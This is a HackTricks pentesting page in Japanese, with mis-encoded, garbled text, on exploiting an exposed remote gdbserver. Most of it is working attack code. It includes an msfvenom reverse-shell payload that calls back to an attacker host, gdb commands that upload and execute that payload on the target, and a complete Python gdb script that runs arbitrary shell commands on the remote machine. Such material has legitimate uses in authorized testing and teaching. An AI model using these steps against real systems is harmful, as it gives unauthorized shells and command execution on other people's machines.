# ãƒªãƒ¢ãƒ¼ãƒˆGdbServerã®ãƒšãƒ³ãƒ†ã‚¹ãƒˆ

<details>

<summary><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>ã§AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§å­¦ã¶</strong></a><strong>ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•ï¼š

- **HackTricksã§ä¼æ¥­ã‚’å®£ä¼ã—ãŸã„**ã‹**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
- [**å…¬å¼PEASSï¼†HackTricksã‚¹ã‚¦ã‚§ã‚°**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã‚‹
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¦‹ã¤ã‘ã‚‹
- ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã‚„[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã™ã‚‹
- **HackTricks**ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹

</details>

<figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

**è„†å¼±æ€§è©•ä¾¡ã¨ãƒšãƒãƒˆãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ãƒ†ã‚¹ãƒˆã®ãŸã‚ã®å³åº§ã«åˆ©ç”¨å¯èƒ½ãªã‚»ãƒƒãƒˆã‚¢ãƒƒãƒ—**ã€‚ãƒ¬ã‚³ãƒ³ã‹ã‚‰ãƒ¬ãƒãƒ¼ãƒˆä½œæˆã¾ã§ã€20ä»¥ä¸Šã®ãƒ„ãƒ¼ãƒ«ã¨æ©Ÿèƒ½ã‚’ä½¿ç”¨ã—ã¦ã©ã“ã‹ã‚‰ã§ã‚‚å®Œå…¨ãªãƒšãƒ³ãƒ†ã‚¹ãƒˆã‚’å®Ÿè¡Œã—ã¾ã™ã€‚ç§ãŸã¡ã¯ãƒšãƒ³ãƒ†ã‚¹ã‚¿ãƒ¼ã‚’ç½®ãæ›ãˆã‚‹ã®ã§ã¯ãªãã€å½¼ã‚‰ã«æ™‚é–“ã‚’æˆ»ã—ã¦ã•ã‚‰ã«æ·±ãæ˜ã‚Šä¸‹ã’ãŸã‚Šã€ã‚·ã‚§ãƒ«ã‚’ãƒãƒƒãƒ—ã—ãŸã‚Šã€æ¥½ã—ã‚“ã ã‚Šã™ã‚‹ãŸã‚ã®ã‚«ã‚¹ã‚¿ãƒ ãƒ„ãƒ¼ãƒ«ã€æ¤œå‡ºã€ãŠã‚ˆã³ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’é–‹ç™ºã—ã¦ã„ã¾ã™ã€‚

{% embed url="https://pentest-tools.com/" %}

## **åŸºæœ¬æƒ…å ±**

**gdbserver**ã¯ã€ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã®ãƒªãƒ¢ãƒ¼ãƒˆãƒ‡ãƒãƒƒã‚°ã‚’å¯èƒ½ã«ã™ã‚‹ãƒ„ãƒ¼ãƒ«ã§ã™ã€‚ã“ã‚Œã¯ã€ãƒ‡ãƒãƒƒã‚°ãŒå¿…è¦ãªãƒ—ãƒ­ã‚°ãƒ©ãƒ ã¨åŒã˜ã‚·ã‚¹ãƒ†ãƒ ã§å®Ÿè¡Œã•ã‚Œã‚‹ã€Œã‚¿ãƒ¼ã‚²ãƒƒãƒˆã€ã¨ã—ã¦çŸ¥ã‚‰ã‚Œã‚‹ã‚·ã‚¹ãƒ†ãƒ ã§å®Ÿè¡Œã•ã‚Œã¾ã™ã€‚ã“ã®ã‚»ãƒƒãƒˆã‚¢ãƒƒãƒ—ã«ã‚ˆã‚Šã€**GNUãƒ‡ãƒãƒƒã‚¬**ãŒã€ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã¨ãƒ‡ãƒãƒƒã‚°å¯¾è±¡ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã®ãƒã‚¤ãƒŠãƒªã‚³ãƒ”ãƒ¼ãŒæ ¼ç´ã•ã‚Œã¦ã„ã‚‹ã€Œãƒ›ã‚¹ãƒˆã€ã¨å‘¼ã°ã‚Œã‚‹åˆ¥ã®ãƒã‚·ãƒ³ã‹ã‚‰æ¥ç¶šã§ãã¾ã™ã€‚**gdbserver**ã¨ãƒ‡ãƒãƒƒã‚¬ã®é–“ã®æ¥ç¶šã¯ã€TCPã¾ãŸã¯ã‚·ãƒªã‚¢ãƒ«ãƒ©ã‚¤ãƒ³ã‚’ä»‹ã—ã¦è¡Œã‚ã‚Œã€æŸ”è»Ÿãªãƒ‡ãƒãƒƒã‚°ã‚»ãƒƒãƒˆã‚¢ãƒƒãƒ—ãŒå¯èƒ½ã§ã™ã€‚

**gdbserverã‚’ä»»æ„ã®ãƒãƒ¼ãƒˆã§ãƒªãƒƒã‚¹ãƒ³**ã•ã›ã‚‹ã“ã¨ãŒã§ãã€**nmapã¯ç¾æ™‚ç‚¹ã§ã¯ãã®ã‚µãƒ¼ãƒ“ã‚¹ã‚’èªè­˜ã™ã‚‹ã“ã¨ãŒã§ãã¾ã›ã‚“**ã€‚

## Exploitation

### ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã—ã¦å®Ÿè¡Œ

**msfvenomã‚’ä½¿ç”¨ã—ã¦elfãƒãƒƒã‚¯ãƒ‰ã‚¢ã‚’ç°¡å˜ã«ä½œæˆ**ã—ã€ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã—ã¦å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š
```bash
# Trick shared by @B1n4rySh4d0w
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 PrependFork=true -f elf -o binary.elf

chmod +x binary.elf

gdb binary.elf

# Set remote debuger target
target extended-remote 10.10.10.11:1337

# Upload elf file
remote put binary.elf binary.elf

# Set remote executable file
set remote exec-file /home/user/binary.elf

# Execute reverse shell executable
run

# You should get your reverse-shell
```
### ä»»æ„ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹

åˆ¥ã®æ–¹æ³•ã¨ã—ã¦ã€**ãƒ‡ãƒãƒƒã‚¬ã«ä»»æ„ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã•ã›ã‚‹**[**pythonã‚«ã‚¹ã‚¿ãƒ ã‚¹ã‚¯ãƒªãƒ—ãƒˆã¯ã“ã¡ã‚‰ã‹ã‚‰å–å¾—ã§ãã¾ã™**](https://stackoverflow.com/questions/26757055/gdbserver-execute-shell-commands-of-the-target)ã€‚
```bash
# Given remote terminal running `gdbserver :2345 ./remote_executable`, we connect to that server.
target extended-remote 192.168.1.4:2345

# Load our custom gdb command `rcmd`.
source ./remote-cmd.py

# Change to a trusty binary and run it to load it
set remote exec-file /bin/bash
r

# Run until a point where libc has been loaded on the remote process, e.g. start of main().
tb main
r

# Run the remote command, e.g. `ls`.
rcmd ls
```
ã¾ãšã¯**ã“ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’ãƒ­ãƒ¼ã‚«ãƒ«ã§ä½œæˆã—ã¦ãã ã•ã„**ï¼š

{% code title="remote-cmd.py" %}
```python
#!/usr/bin/env python3

import gdb
import re
import traceback
import uuid


class RemoteCmd(gdb.Command):
def __init__(self):
self.addresses = {}

self.tmp_file = f'/tmp/{uuid.uuid4().hex}'
gdb.write(f"Using tmp output file: {self.tmp_file}.\n")

gdb.execute("set detach-on-fork off")
gdb.execute("set follow-fork-mode parent")

gdb.execute("set max-value-size unlimited")
gdb.execute("set pagination off")
gdb.execute("set print elements 0")
gdb.execute("set print repeats 0")

super(RemoteCmd, self).__init__("rcmd", gdb.COMMAND_USER)

def preload(self):
for symbol in [
"close",
"execl",
"fork",
"free",
"lseek",
"malloc",
"open",
"read",
]:
self.load(symbol)

def load(self, symbol):
if symbol not in self.addresses:
address_string = gdb.execute(f"info address {symbol}", to_string=True)
match = re.match(
f'Symbol "{symbol}" is at ([0-9a-fx]+) .*', address_string, re.IGNORECASE
)
if match and len(match.groups()) > 0:
self.addresses[symbol] = match.groups()[0]
else:
raise RuntimeError(f'Could not retrieve address for symbol "{symbol}".')

return self.addresses[symbol]

def output(self):
# From `fcntl-linux.h`
O_RDONLY = 0
gdb.execute(
f'set $fd = (int){self.load("open")}("{self.tmp_file}", {O_RDONLY})'
)

# From `stdio.h`
SEEK_SET = 0
SEEK_END = 2
gdb.execute(f'set $len = (int){self.load("lseek")}($fd, 0, {SEEK_END})')
gdb.execute(f'call (int){self.load("lseek")}($fd, 0, {SEEK_SET})')
if int(gdb.convenience_variable("len")) <= 0:
gdb.write("No output was captured.")
return

gdb.execute(f'set $mem = (void*){self.load("malloc")}($len)')
gdb.execute(f'call (int){self.load("read")}($fd, $mem, $len)')
gdb.execute('printf "%s\\n", (char*) $mem')

gdb.execute(f'call (int){self.load("close")}($fd)')
gdb.execute(f'call (int){self.load("free")}($mem)')

def invoke(self, arg, from_tty):
try:
self.preload()

is_auto_solib_add = gdb.parameter("auto-solib-add")
gdb.execute("set auto-solib-add off")

parent_inferior = gdb.selected_inferior()
gdb.execute(f'set $child_pid = (int){self.load("fork")}()')
child_pid = gdb.convenience_variable("child_pid")
child_inferior = list(
filter(lambda x: x.pid == child_pid, gdb.inferiors())
)[0]
gdb.execute(f"inferior {child_inferior.num}")

try:
gdb.execute(
f'call (int){self.load("execl")}("/bin/sh", "sh", "-c", "exec {arg} >{self.tmp_file} 2>&1", (char*)0)'
)
except gdb.error as e:
if (
"The program being debugged exited while in a function called from GDB"
in str(e)
):
pass
else:
raise e
finally:
gdb.execute(f"inferior {parent_inferior.num}")
gdb.execute(f"remove-inferiors {child_inferior.num}")

self.output()
except Exception as e:
gdb.write("".join(traceback.TracebackException.from_exception(e).format()))
raise e
finally:
gdb.execute(f'set auto-solib-add {"on" if is_auto_solib_add else "off"}')


RemoteCmd()
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

**è„†å¼±æ€§è©•ä¾¡ãŠã‚ˆã³ãƒšãƒãƒˆãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ãƒ†ã‚¹ãƒˆã®ãŸã‚ã®å³åº§ã«åˆ©ç”¨å¯èƒ½ãªã‚»ãƒƒãƒˆã‚¢ãƒƒãƒ—**ã€‚ãƒ¬ã‚³ãƒ³ã‹ã‚‰ãƒ¬ãƒãƒ¼ãƒˆä½œæˆã¾ã§ã€20ä»¥ä¸Šã®ãƒ„ãƒ¼ãƒ«ã¨æ©Ÿèƒ½ã‚’ä½¿ç”¨ã—ã¦ã©ã“ã‹ã‚‰ã§ã‚‚å®Œå…¨ãªãƒšãƒãƒˆãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ãƒ†ã‚¹ãƒˆã‚’å®Ÿè¡Œã—ã¾ã™ã€‚ç§ãŸã¡ã¯ãƒšãƒ³ãƒ†ã‚¹ã‚¿ãƒ¼ã‚’ç½®ãæ›ãˆã‚‹ã®ã§ã¯ãªãã€å½¼ã‚‰ã«æ™‚é–“ã‚’æˆ»ã—ã¦ã•ã‚‰ã«æ·±ãæ˜ã‚Šä¸‹ã’ãŸã‚Šã€ã‚·ã‚§ãƒ«ã‚’ãƒãƒƒãƒ—ã—ãŸã‚Šã€æ¥½ã—ã‚“ã ã‚Šã™ã‚‹ãŸã‚ã«ã‚«ã‚¹ã‚¿ãƒ ãƒ„ãƒ¼ãƒ«ã€æ¤œå‡ºãŠã‚ˆã³ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’é–‹ç™ºã—ã¦ã„ã¾ã™ã€‚

{% embed url="https://pentest-tools.com/" %}

<details>

<summary><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰ã§ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•ï¼š

* **HackTricksã§ä¼æ¥­ã‚’å®£ä¼ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„å ´åˆã¯** [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) **ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼**
* [**å…¬å¼PEASSï¼†HackTricksã‚¹ãƒ¯ãƒƒã‚°**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¦‹ã¤ã‘ã‚‹
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã«å‚åŠ ã™ã‚‹ã‹ã€[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live) **ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹ã€‚**
* **HackTricks**](https://github.com/carlospolop/hacktricks) **ãŠã‚ˆã³** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã—ã¦ãã ã•ã„ã€‚**

</details>
